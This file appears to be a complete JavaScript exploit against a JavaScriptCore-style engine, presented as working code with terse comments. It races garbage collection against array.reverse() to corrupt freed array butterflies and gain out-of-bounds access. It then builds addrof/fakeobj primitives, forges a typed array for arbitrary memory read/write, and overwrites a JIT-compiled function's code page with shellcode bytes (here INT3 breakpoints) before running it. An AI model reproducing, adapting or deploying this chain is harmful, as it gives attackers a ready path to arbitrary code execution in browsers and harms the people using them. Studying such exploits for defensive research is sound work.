// Load Int library, thanks saelo!
load('util.js');
load('int64.js');


// Helpers to convert from float to in a few random places
var conva = new ArrayBuffer(8);
var convf = new Float64Array(conva);
var convi = new Uint32Array(conva);
var convi8 = new Uint8Array(conva);

var floatarr_magic = new Int64('0x3131313131313131').asDouble();
var floatarr_magic = new Int64('0x3131313131313131').asDouble();
var jsval_magic = new Int64('0x3232323232323232').asDouble();

var structs = [];

function log(x) {
    print(x);
}

// Look OOB for array we can use with JSValues
function findArrayOOB(corrupted_arr, groom) {
    log("Looking for JSValue array with OOB Float array");
    for (let i = 0; i<corrupted_arr.length; i++) {
        convf[0] = corrupted_arr[i];

        // Find the magic value we stored in the JSValue Array
        if (convi[0] == 0x10) {
            convf[0] = corrupted_arr[i+1];
            if (convi[0] != 0x32323232)
                continue;

            // Change the first element of the array
            corrupted_arr[i+1] = new Int64('0x3131313131313131').asDouble();

            let target = null;
            // Find which array we modified
            for (let j = 0; j<groom.length; j++) {
                if (groom[j][0] != jsval_magic) {
                    target = groom[j];
                    break
                }
            }

            log("Found target array for addrof/fakeobj");

            // This object will hold our primitives
            let prims = {};

            let oob_ind = i+1;

            // Get the address of a given jsobject
            prims.addrof = function(x) {
                // To do this we put the object in the jsvalue array and
                // access it OOB with our float array
                target[0] = x;
                return Int64.fromDouble(corrupted_arr[oob_ind]);
            }

            // Return a jsobject at a given address
            prims.fakeobj = function(addr) {
                // To do this we overwrite the first slot of the jsvalue array
                // with the OOB float array
                corrupted_arr[oob_ind] = addr.asDouble();
                return target[0];
            }

            return prims;
        }
    }
}

// Here we will spray structure IDs for Float64Arrays
// See http://www.phrack.org/papers/attacking_javascript_engines.html
function sprayStructures() {
  function randomString() {
      return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
  }
  // Spray arrays for structure id
  for (let i = 0; i < 0x1000; i++) {
      let a = new Float64Array(1);
      // Add a new property to create a new Structure instance.
      a[randomString()] = 1337;
      structs.push(a);
  }
}


// Here we will create our fake typed array and get arbitrary read/write
// See http://www.phrack.org/papers/attacking_javascript_engines.html
function getArb(prims) {
    sprayStructures()

    let utarget = new Uint8Array(0x10000);
    utarget[0] = 0x41;

    // Our fake array
    // Structure id guess is 0x200
    // [ Indexing type = 0 ][ m_type = 0x27 (float array) ][ m_flags = 0x18 (OverridesGetOwnPropertySlot) ][ m_cellState = 1 (NewWhite)]
    let jscell = new Int64('0x0118270000000200');

    // Construct the object
    // Each attribute will set 8 bytes of the fake object inline
    obj = {
        'a': jscell.asDouble(),

        // Butterfly can be anything
        'b': false,

        // Target we want to write to
        'c': utarget,

        // Length and flags
        'd': new Int64('0x0001000000000010').asDouble()
    };


    // Get the address of the values we stored in obj
    let objAddr = prims.addrof(obj).add(16);
    log("Obj addr + 16 = "+objAddr);

    // Create a fake object from this pointer
    let fakearray = prims.fakeobj(objAddr);

    // Attempt to find a valid ID for our fake object
    while(!(fakearray instanceof Float64Array)) {
        jscell.add(1);
        obj['a'] = jscell.asDouble();
    }

    log("Matched structure id!");

    // Set data at a given address
    prims.set = function(addr, arr) {
        fakearray[2] = addr.asDouble();
        utarget.set(arr);
    }

    // Read 8 bytes as an Int64 at a given address
    prims.read64 = function(addr) {
        fakearray[2] = addr.asDouble();
        let bytes = Array(8);
        for (let i=0; i<8; i++) {
            bytes[i] = utarget[i];
        }
        return new Int64(bytes);
    }

    // Write an Int64 as 8 bytes at a given address
    prims.write64 = function(addr, value) {
        fakearray[2] = addr.asDouble();
        utarget.set(value.bytes);
    }
}

// Here we will use build primitives to eventually overwrite the JIT page
function exploit(corrupted_arr, groom) {
    save.push(groom);
    save.push(corrupted_arr);

    // Create fakeobj and addrof primitives
    let prims = findArrayOOB(corrupted_arr, groom);

    // Upgrade to arb read/write from OOB read/write
    getArb(prims);

    // Build an arbitrary JIT function
    // This was basically just random junk to make the JIT function larger
    let jit = function(x) {
        var j = []; j[0] = 0x6323634;
        return x*5 + x - x*x /0x2342513426 +(x - x+0x85720642 *(x +3 -x / x+0x41424344)/0x41424344)+j[0]; };

    // Make sure the JIT function has been compiled
    jit();
    jit();
    jit();

    // Traverse the JSFunction object to retrieve a non-poisoned pointer
    log("Finding jitpage");
    let jitaddr = prims.read64(
        prims.read64(
            prims.read64(
                prims.read64(
                    prims.addrof(jit).add(3*8)
                ).add(3*8)
            ).add(3*8)
        ).add(5*8)
    );
    log("Jit page addr = "+jitaddr);

    // Overwrite the JIT code with our INT3s
    log("Writting shellcode over jit page");
    prims.set(jitaddr.add(32), [0xcc, 0xcc, 0xcc, 0xcc]);

    // Call the JIT function, triggering our INT3s
    log("Calling jit function");
    jit();

    throw("JIT returned");
}


// Find and set the length of a non-freed butterfly with our unstable OOB primitive
function setLen(uaf_arr, ind) {
    let f=0;
    for (let i=0; i<uaf_arr.length; i++) {
        convf[0] = uaf_arr[i];

        // Look for a new float array, and set the length
        if (convi[0] == 0x10) {
            convf[0] = uaf_arr[i+1];
            if (convi[0] == 0x32323232 && convi[1] == 0x32323232) {
                convi[0] = 0x42424242;
                convi[1] = 0x42424242;
                uaf_arr[i] = convf[0];
                return;
            }
        }
    }

    throw("Could not find anouther array to corrupt");
}


let oob_rw_unstable = null;
let oob_rw_unstable_ind = null;
let oob_rw_stable = null;

// After this point we would stop seeing GCs happen enough to race :(
const limit = 10;
const butterfly_size = 32

let save = [0, 0]

for(let at = 0; at < limit; at++) {
    log("Trying to race GC and array.reverse() Attempt #"+(at+1));

    // Allocate the initial victim and target arrays
    let victim_arrays = new Array(2048);
    let groom  = new Array(2048);
    for (let i=0; i<victim_arrays.length; i++) {
        victim_arrays[i] = new Array(butterfly_size).fill(floatarr_magic)
        groom[i] = new Array(butterfly_size/2).fill(jsval_magic)
    }

    let vv = [];
    let  v = []

    // Allocate large strings to trigger the GC while calling reverse
    for (let i = 0; i < 506; i++) {
        for(let j = 0; j < 0x100; j++) {
            // Cause GCs to trigger while we are racing with reverse
            if (j == 0x44) { v.push(new String("B").repeat(0x10000*save.length/2)) }
            victim_arrays.reverse()
        }
    }

    for (let i = 0; i < victim_arrays.length; i++) {

        // Once we see we have replaced a free'd butterfly
        // fill the replacing array with 0x41414141... to smash rest
        // of UAF'ed butterflies

        // We know the size will be 506, because it will have been replaced with v
        // we were pushing into in the loop above

        if(victim_arrays[i].length == 506) {
            victim_arrays[i].fill(2261634.5098039214)
        }

        // Find the first butterfly we have smashed
        // this will be an unstable OOB r/w

        if(victim_arrays[i].length == 0x41414141) {
            oob_rw_unstable = victim_arrays[i];
            oob_rw_unstable_ind = i;
            break;
        }
    }

    // If we successfully found a smashed and still freed butterfly
    // use it to corrupt a non-freed butterfly for stability

    if(oob_rw_unstable) {

        setLen(oob_rw_unstable, oob_rw_unstable_ind)

        for (let i = 0; i < groom.length; i++) {
            // Find which array we just corrupted
            if(groom[i].length == 0x42424242) {
                oob_rw_stable = groom[i];
                break;
            }
        }
        if (!oob_rw_stable) {
            throw("Groom seems to have failed :(");
        }
    }

    // chew CPU to avoid a segfault and help with gc schedule
    for (let i = 0; i < 0x100000; i++) { }


    // Attempt to clean up some
    let f = []
    for (let i = 0; i < 0x2000; i++) {
        f.push(new Array(16).fill(2261634.6098039214))
    }

    save.push(victim_arrays)
    save.push(v)
    save.push(f)
    save.push(groom)

    if (oob_rw_stable) {
        log("Found stable corrupted butterfly! Now the fun begins...");
        exploit(oob_rw_stable, groom);
        break;
    }

}
throw("Failed to find any UAF'ed butterflies");